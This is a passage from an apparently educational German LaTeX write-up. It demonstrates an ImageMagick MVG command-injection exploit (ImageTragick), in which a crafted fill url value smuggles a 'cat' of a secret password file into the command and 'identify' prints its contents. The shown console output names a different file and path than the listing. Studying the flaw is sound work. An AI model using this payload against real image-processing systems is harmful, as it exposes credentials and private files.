\newpage
\subsection{Zweites Beispiel: Auslesen einer geheimen Datei}\label{subsec:zweites-beispiel:-auslesen-einer-geheimen-datei}

Das erste Beispiel hat das Problem gut gezeigt, allerdings nicht die problematische Auswirkung der Sicherheitslücke.
Im nächsten Beispiel soll der Inhalt einer privaten Passwort-Datei angezeigt werden.
Vergleichbar ist dies mit einer Config-Datei, in der beispielsweise Zugangsdaten zu einer Datenbank hinterlegt sind.\\

Hierfür wird folgende Datei erstellt und befüllt:

\begin{lstlisting}[language=Bash, caption=Beispiel 2,label={lst:bsp2}]
> vim test2.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://miro.medium.com/max/700/1*MI686k5sDQrISBM6L8pf5A.jpeg"|cat "/home/max/secretFile)'
pop graphic-context
\end{lstlisting}
\vspace{5mm}

Nach dem ausführen erscheint in der Console der Inhalt der geheimen Datei:\\ => "`MY\_SECRET\_PASSWORD"'

\begin{lstlisting}[language=Bash, caption=Beispiel 2 - Identify,label={lst:bsp2identify}]
> identify test2.mvg
MY_SECRET_PASSWORD
identify: unrecognized color `https://miro.medium.com/max/700/1*MI686k5sDQrISBM6L8pf5A.jpeg"|cat "SECRET_FILE' @ warning/color.c/GetColorCompliance/1046.
identify: no decode delegate for this image format `HTTPS' @ error/constitute.c/ReadImage/535.
exploit.mvg MVG 640x480 640x480+0+0 16-bit sRGB 153B 0.000u 0:00.000
identify: non-conforming drawing primitive definition `fill' @ error/draw.c/DrawImage/3169.
root@vm-its:~/install/6.8.0/code/case2#
\end{lstlisting}
\vspace{5mm}
